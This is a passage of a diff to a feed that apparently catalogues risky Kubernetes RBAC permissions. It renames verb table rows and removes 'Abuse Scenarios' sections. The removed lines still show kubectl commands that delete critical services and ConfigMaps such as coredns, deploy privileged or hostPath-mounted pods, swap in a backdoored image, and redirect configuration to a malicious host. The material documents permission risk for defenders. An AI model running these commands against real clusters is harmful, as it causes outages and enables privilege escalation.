  &lt;tr>
  &lt;td>Tags&lt;/td>
@@ -3684,8 +3478,8 @@
  &lt;td>services&lt;/td>
  &lt;/tr>
  &lt;tr>
- &lt;td>Verbs&lt;/td>
- &lt;td>create, update, patch, delete&lt;/td>
+ &lt;td>Risky Verb Combinations&lt;/td>
+ &lt;td>[create] · [update] · [patch] · [delete]&lt;/td>
  &lt;/tr>
  &lt;tr>
  &lt;td>Tags&lt;/td>
@@ -3698,32 +3492,7 @@
  &lt;/tbody>
 &lt;/table>
 &lt;h2 id="description">Description&lt;/h2>
-&lt;p>Allows creating, updating, or deleting Services in any namespace. This can be abused to expose internal applications, modify service types (e.g., ClusterIP to LoadBalancer), redirect traffic (by changing selectors), or cause denial of service.&lt;/p>
-&lt;h2 id="abuse-scenarios">Abuse Scenarios&lt;/h2>
-&lt;ol>
-&lt;li>Create a new LoadBalancer Service to expose an internal application externally.&lt;/li>
-&lt;/ol>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl create -n &amp;lt;namespace&amp;gt; -f - &lt;span class="s">&amp;lt;&amp;lt;EOF
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">apiVersion: v1
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">kind: Service
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">metadata:
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> name: exposed-internal-app
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">spec:
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> selector:
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> app: &amp;lt;internal-app-label&amp;gt;
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> ports:
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> - protocol: TCP
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> port: 80
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> targetPort: 8080
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> type: LoadBalancer
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">EOF&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Example: kubectl create -n production -f - &amp;lt;&amp;lt;EOF ... EOF (expose a database)&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="2">
-&lt;li>Delete a critical Service, causing application unavailability (DoS).&lt;/li>
-&lt;/ol>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl delete service &amp;lt;service-name&amp;gt; -n &amp;lt;namespace&amp;gt;
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Example: kubectl delete service kubernetes -n default&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Manage Services in a namespace</title><link>https://rbac-atlas.github.io/rules/1076/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1076/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
+&lt;p>Allows creating, updating, or deleting Services in any namespace. This can be abused to expose internal applications, modify service types (e.g., ClusterIP to LoadBalancer), redirect traffic (by changing selectors), or cause denial of service.&lt;/p></description></item><item><title>Manage Services in a namespace</title><link>https://rbac-atlas.github.io/rules/1076/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1076/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
 &lt;table>
  &lt;thead>
  &lt;tr>
@@ -3762,8 +3531,8 @@
  &lt;td>services&lt;/td>
  &lt;/tr>
  &lt;tr>
- &lt;td>Verbs&lt;/td>
- &lt;td>create, update, patch, delete&lt;/td>
+ &lt;td>Risky Verb Combinations&lt;/td>
+ &lt;td>[create] · [update] · [patch] · [delete]&lt;/td>
  &lt;/tr>
  &lt;tr>
  &lt;td>Tags&lt;/td>
@@ -3840,8 +3609,8 @@
  &lt;td>statefulsets&lt;/td>
  &lt;/tr>
  &lt;tr>
- &lt;td>Verbs&lt;/td>
- &lt;td>create, update, patch, delete&lt;/td>
+ &lt;td>Risky Verb Combinations&lt;/td>
+ &lt;td>[create] · [update] · [patch] · [delete]&lt;/td>
  &lt;/tr>
  &lt;tr>
  &lt;td>Tags&lt;/td>
@@ -3854,41 +3623,7 @@
  &lt;/tbody>
 &lt;/table>
 &lt;h2 id="description">Description&lt;/h2>
-&lt;p>Grants permission to create, update, or delete StatefulSets across all namespaces. Similar to Deployments, this can be used to deploy pods (often stateful applications) with privileged configurations, leading to privilege escalation, persistence, and tampering.&lt;/p>
-&lt;h2 id="abuse-scenarios">Abuse Scenarios&lt;/h2>
-&lt;ol>
-&lt;li>Create a new StatefulSet with a privileged pod template.&lt;/li>
-&lt;/ol>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl create -n &amp;lt;namespace&amp;gt; -f - &lt;span class="s">&amp;lt;&amp;lt;EOF
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">apiVersion: apps/v1
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">kind: StatefulSet
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">metadata:
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> name: privileged-statefulset
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">spec:
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> serviceName: &amp;#34;privileged-service&amp;#34;
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> replicas: 1
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> selector:
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> matchLabels:
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> app: privileged-sts
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> template:
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> metadata:
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> labels:
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> app: privileged-sts
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> spec:
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> containers:
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> - name: attacker
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> image: busybox
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> command: [&amp;#34;/bin/sh&amp;#34;, &amp;#34;-c&amp;#34;, &amp;#34;sleep infinity&amp;#34;]
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> securityContext:
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> privileged: true
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">EOF&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Example: kubectl create -n default -f - &amp;lt;&amp;lt;EOF ... EOF&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="2">
-&lt;li>Scale a critical StatefulSet to zero replicas, causing data inconsistency or DoS.&lt;/li>
-&lt;/ol>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl scale statefulset &amp;lt;statefulset-name&amp;gt; -n &amp;lt;namespace&amp;gt; --replicas&lt;span class="o">=&lt;/span>&lt;span class="m">0&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Example: kubectl scale statefulset my-database -n production --replicas=0&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Manage StatefulSets in a namespace</title><link>https://rbac-atlas.github.io/rules/1038/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1038/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
+&lt;p>Grants permission to create, update, or delete StatefulSets across all namespaces. Similar to Deployments, this can be used to deploy pods (often stateful applications) with privileged configurations, leading to privilege escalation, persistence, and tampering.&lt;/p></description></item><item><title>Manage StatefulSets in a namespace</title><link>https://rbac-atlas.github.io/rules/1038/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1038/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
 &lt;table>
  &lt;thead>
  &lt;tr>
@@ -3927,8 +3662,8 @@
  &lt;td>statefulsets&lt;/td>
  &lt;/tr>
  &lt;tr>
- &lt;td>Verbs&lt;/td>
- &lt;td>create, update, patch, delete&lt;/td>
+ &lt;td>Risky Verb Combinations&lt;/td>
+ &lt;td>[create] · [update] · [patch] · [delete]&lt;/td>
  &lt;/tr>
  &lt;tr>
  &lt;td>Tags&lt;/td>
@@ -3941,46 +3676,7 @@
  &lt;/tbody>
 &lt;/table>
 &lt;h2 id="description">Description&lt;/h2>
-&lt;p>Allows creating, updating, or deleting StatefulSets within a specific namespace. This can be used to deploy stateful applications with potentially privileged settings, leading to potential privilege escalation, persistence, and tampering within that namespace.&lt;/p>
-&lt;h2 id="abuse-scenarios">Abuse Scenarios&lt;/h2>
-&lt;ol>
-&lt;li>Create a new StatefulSet with a hostPath mount in the namespace.&lt;/li>
-&lt;/ol>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl create -n &amp;lt;namespace&amp;gt; -f - &lt;span class="s">&amp;lt;&amp;lt;EOF
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">apiVersion: apps/v1
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">kind: StatefulSet
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">metadata:
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> name: hostpath-statefulset
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">spec:
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> serviceName: &amp;#34;hostpath-service&amp;#34;
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> replicas: 1
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> selector:
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> matchLabels:
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> app: hostpath-sts
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> template:
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> metadata:
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> labels:
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> app: hostpath-sts
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> spec:
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> containers:
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> - name: hostpath-container
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> image: busybox
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> command: [&amp;#34;/bin/sh&amp;#34;, &amp;#34;-c&amp;#34;, &amp;#34;sleep infinity&amp;#34;]
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> volumeMounts:
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> - mountPath: /host-var
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> name: host-var
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> volumes:
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> - name: host-var
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> hostPath:
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> path: /var
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">EOF&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Example: kubectl create -n default -f - &amp;lt;&amp;lt;EOF ... EOF&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="2">
-&lt;li>Update an existing StatefulSet&amp;rsquo;s image to a malicious one.&lt;/li>
-&lt;/ol>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl &lt;span class="nb">set&lt;/span> image statefulset/&amp;lt;statefulset-name&amp;gt; &amp;lt;container-name&amp;gt;&lt;span class="o">=&lt;/span>&amp;lt;malicious-image&amp;gt; -n &amp;lt;namespace&amp;gt;
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Example: kubectl set image statefulset/my-app-db db=attacker/db-backdoor -n production&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Manage StorageClasses</title><link>https://rbac-atlas.github.io/rules/1056/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1056/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
+&lt;p>Allows creating, updating, or deleting StatefulSets within a specific namespace. This can be used to deploy stateful applications with potentially privileged settings, leading to potential privilege escalation, persistence, and tampering within that namespace.&lt;/p></description></item><item><title>Manage StorageClasses</title><link>https://rbac-atlas.github.io/rules/1056/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1056/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
 &lt;table>
  &lt;thead>
  &lt;tr>
@@ -4019,8 +3715,8 @@
  &lt;td>storageclasses&lt;/td>
  &lt;/tr>
  &lt;tr>
- &lt;td>Verbs&lt;/td>
- &lt;td>create, update, patch, delete&lt;/td>
+ &lt;td>Risky Verb Combinations&lt;/td>
+ &lt;td>[create] · [update] · [patch] · [delete]&lt;/td>
  &lt;/tr>
  &lt;tr>
  &lt;td>Tags&lt;/td>
@@ -4032,27 +3728,7 @@
  &lt;/tbody>
 &lt;/table>
 &lt;h2 id="description">Description&lt;/h2>
-&lt;p>Grants permission to create, update, or delete StorageClasses. StorageClasses define how dynamic provisioning of persistent volumes occurs. Tampering with StorageClasses can lead to denial of service (e.g., by making storage provisioning fail) or misconfiguration of storage resources.&lt;/p>
-&lt;h2 id="abuse-scenarios">Abuse Scenarios&lt;/h2>
-&lt;ol>
-&lt;li>Create a new StorageClass that points to a non-existent or malicious provisioner.&lt;/li>
-&lt;/ol>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl create -f - &lt;span class="s">&amp;lt;&amp;lt;EOF
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">apiVersion: storage.k8s.io/v1
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">kind: StorageClass
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">metadata:
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> name: malicious-storage
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">provisioner: non-existent.provisioner.example.com
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">reclaimPolicy: Delete
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">volumeBindingMode: Immediate
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">EOF&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Example: kubectl create -f - &amp;lt;&amp;lt;EOF ... EOF&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="2">
-&lt;li>Delete an existing StorageClass, preventing new volume provisioning.&lt;/li>
-&lt;/ol>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl delete storageclass &amp;lt;storageclass-name&amp;gt;
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Example: kubectl delete storageclass standard&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Manage ValidatingWebhookConfigurations</title><link>https://rbac-atlas.github.io/rules/1044/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1044/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
+&lt;p>Grants permission to create, update, or delete StorageClasses. StorageClasses define how dynamic provisioning of persistent volumes occurs. Tampering with StorageClasses can lead to denial of service (e.g., by making storage provisioning fail) or misconfiguration of storage resources.&lt;/p></description></item><item><title>Manage ValidatingWebhookConfigurations</title><link>https://rbac-atlas.github.io/rules/1044/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1044/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
 &lt;table>
  &lt;thead>
  &lt;tr>
@@ -4091,8 +3767,8 @@
  &lt;td>validatingwebhookconfigurations&lt;/td>
  &lt;/tr>
  &lt;tr>
- &lt;td>Verbs&lt;/td>
- &lt;td>create, update, patch, delete&lt;/td>
+ &lt;td>Risky Verb Combinations&lt;/td>
+ &lt;td>[create] · [update] · [patch] · [delete]&lt;/td>
  &lt;/tr>
  &lt;tr>
  &lt;td>Tags&lt;/td>
@@ -4143,8 +3819,8 @@
  &lt;td>volumeattachments&lt;/td>
  &lt;/tr>
  &lt;tr>
- &lt;td>Verbs&lt;/td>
- &lt;td>create, update, patch, delete, get, list, watch&lt;/td>
+ &lt;td>Risky Verb Combinations&lt;/td>
+ &lt;td>[create] · [update] · [patch] · [delete] · [get] · [list] · [watch]&lt;/td>
  &lt;/tr>
  &lt;tr>
  &lt;td>Tags&lt;/td>
@@ -4197,8 +3873,8 @@
  &lt;td>configmaps&lt;/td>
  &lt;/tr>
  &lt;tr>
- &lt;td>Verbs&lt;/td>
- &lt;td>create, update, patch, delete&lt;/td>
+ &lt;td>Risky Verb Combinations&lt;/td>
+ &lt;td>[create] · [update] · [patch] · [delete]&lt;/td>
  &lt;/tr>
  &lt;tr>
  &lt;td>Tags&lt;/td>
@@ -4210,24 +3886,7 @@
  &lt;/tbody>
 &lt;/table>
 &lt;h2 id="description">Description&lt;/h2>
-&lt;p>Allows creating, updating, patching, or deleting ConfigMaps in any namespace. This enables an attacker to tamper with application configurations across the cluster, potentially leading to misconfigurations, denial of service, or privilege escalation if applications consume malicious configurations.&lt;/p>
-&lt;h2 id="abuse-scenarios">Abuse Scenarios&lt;/h2>
-&lt;ol>
-&lt;li>Create a new ConfigMap with malicious configuration in any namespace.&lt;/li>
-&lt;/ol>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl create configmap &amp;lt;new-cm-name&amp;gt; --from-literal&lt;span class="o">=&lt;/span>&lt;span class="nv">malicious_setting&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nb">true&lt;/span> -n &amp;lt;namespace&amp;gt;
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Example: kubectl create configmap backdoor-config --from-literal=debug_mode=true -n kube-system&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="2">
-&lt;li>Patch an existing ConfigMap to alter application behavior.&lt;/li>
-&lt;/ol>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl patch configmap &amp;lt;configmap-name&amp;gt; -n &amp;lt;namespace&amp;gt; --type&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;json&amp;#39;&lt;/span> -p&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;[{&amp;#34;op&amp;#34;: &amp;#34;replace&amp;#34;, &amp;#34;path&amp;#34;: &amp;#34;/data/&amp;lt;key&amp;gt;&amp;#34;, &amp;#34;value&amp;#34;: &amp;#34;&amp;lt;new-value&amp;gt;&amp;#34;}]&amp;#39;&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Example: kubectl patch configmap my-app-config -n default --type=&amp;#39;json&amp;#39; -p=&amp;#39;[{&amp;#34;op&amp;#34;: &amp;#34;replace&amp;#34;, &amp;#34;path&amp;#34;: &amp;#34;/data/log_level&amp;#34;, &amp;#34;value&amp;#34;: &amp;#34;DEBUG&amp;#34;}]&amp;#39;&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="3">
-&lt;li>Delete a critical ConfigMap, causing application disruption.&lt;/li>
-&lt;/ol>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl delete configmap &amp;lt;configmap-name&amp;gt; -n &amp;lt;namespace&amp;gt;
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Example: kubectl delete configmap coredns -n kube-system&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Modify ConfigMaps in a namespace</title><link>https://rbac-atlas.github.io/rules/1025/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1025/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
+&lt;p>Allows creating, updating, patching, or deleting ConfigMaps in any namespace. This enables an attacker to tamper with application configurations across the cluster, potentially leading to misconfigurations, denial of service, or privilege escalation if applications consume malicious configurations.&lt;/p></description></item><item><title>Modify ConfigMaps in a namespace</title><link>https://rbac-atlas.github.io/rules/1025/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1025/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
 &lt;table>
  &lt;thead>
  &lt;tr>
@@ -4266,8 +3925,8 @@
  &lt;td>configmaps&lt;/td>
  &lt;/tr>
  &lt;tr>
- &lt;td>Verbs&lt;/td>
- &lt;td>create, update, patch, delete&lt;/td>
+ &lt;td>Risky Verb Combinations&lt;/td>
+ &lt;td>[create] · [update] · [patch] · [delete]&lt;/td>
  &lt;/tr>
  &lt;tr>
  &lt;td>Tags&lt;/td>
@@ -4279,24 +3938,7 @@
  &lt;/tbody>
 &lt;/table>
 &lt;h2 id="description">Description&lt;/h2>
-&lt;p>Grants permission to create, update, patch, or delete ConfigMaps within a specific namespace. This allows an attacker to tamper with application configurations, potentially causing service disruption or enabling further exploitation if applications load malicious settings.&lt;/p>
-&lt;h2 id="abuse-scenarios">Abuse Scenarios&lt;/h2>
-&lt;ol>
-&lt;li>Create a new ConfigMap with malicious configuration in the namespace.&lt;/li>
-&lt;/ol>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl create configmap &amp;lt;new-cm-name&amp;gt; --from-literal&lt;span class="o">=&lt;/span>&lt;span class="nv">malicious_setting&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nb">true&lt;/span> -n &amp;lt;namespace&amp;gt;
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Example: kubectl create configmap dev-backdoor-config --from-literal=enable_shell=true -n development&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="2">
-&lt;li>Patch an existing ConfigMap to alter application behavior within the namespace.&lt;/li>
-&lt;/ol>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl patch configmap &amp;lt;configmap-name&amp;gt; -n &amp;lt;namespace&amp;gt; --type&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;json&amp;#39;&lt;/span> -p&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;[{&amp;#34;op&amp;#34;: &amp;#34;replace&amp;#34;, &amp;#34;path&amp;#34;: &amp;#34;/data/&amp;lt;key&amp;gt;&amp;#34;, &amp;#34;value&amp;#34;: &amp;#34;&amp;lt;new-value&amp;gt;&amp;#34;}]&amp;#39;&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Example: kubectl patch configmap my-app-config -n production --type=&amp;#39;json&amp;#39; -p=&amp;#39;[{&amp;#34;op&amp;#34;: &amp;#34;replace&amp;#34;, &amp;#34;path&amp;#34;: &amp;#34;/data/db_host&amp;#34;, &amp;#34;value&amp;#34;: &amp;#34;malicious-db.example.com&amp;#34;}]&amp;#39;&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="3">
-&lt;li>Delete a critical ConfigMap within the namespace, causing disruption.&lt;/li>
-&lt;/ol>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl delete configmap &amp;lt;configmap-name&amp;gt; -n &amp;lt;namespace&amp;gt;
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Example: kubectl delete configmap my-app-env -n default&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Modify node configuration (labels, taints)</title><link>https://rbac-atlas.github.io/rules/1015/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1015/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
+&lt;p>Grants permission to create, update, patch, or delete ConfigMaps within a specific namespace. This allows an attacker to tamper with application configurations, potentially causing service disruption or enabling further exploitation if applications load malicious settings.&lt;/p></description></item><item><title>Modify node configuration (labels, taints)</title><link>https://rbac-atlas.github.io/rules/1015/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1015/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
 &lt;table>
  &lt;thead>
  &lt;tr>
@@ -4335,8 +3977,8 @@
  &lt;td>nodes&lt;/td>
  &lt;/tr>
  &lt;tr>
- &lt;td>Verbs&lt;/td>
- &lt;td>patch, update&lt;/td>
+ &lt;td>Risky Verb Combinations&lt;/td>
+ &lt;td>[patch] · [update]&lt;/td>
  &lt;/tr>
  &lt;tr>
  &lt;td>Tags&lt;/td>
@@ -4388,8 +4030,8 @@
  &lt;td>secrets&lt;/td>
  &lt;/tr>
  &lt;tr>
- &lt;td>Verbs&lt;/td>
